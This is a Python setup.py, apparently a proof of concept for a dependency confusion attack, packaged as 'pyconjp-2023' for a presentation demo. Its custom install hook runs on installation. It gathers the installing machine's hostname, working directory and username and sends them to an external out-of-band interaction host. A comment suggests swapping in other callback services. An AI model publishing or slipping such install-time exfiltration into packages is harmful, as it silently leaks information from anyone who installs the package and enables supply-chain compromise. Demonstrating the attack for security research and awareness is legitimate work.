#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py
from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("http://cmqzcb12vtc0000zfx1ggkm9sfayyyyyb.oast.fun/",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='pyconjp-2023', #package name
      version='1.0.1',
      description='demonstration test for presentation',
      author='Khalil',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})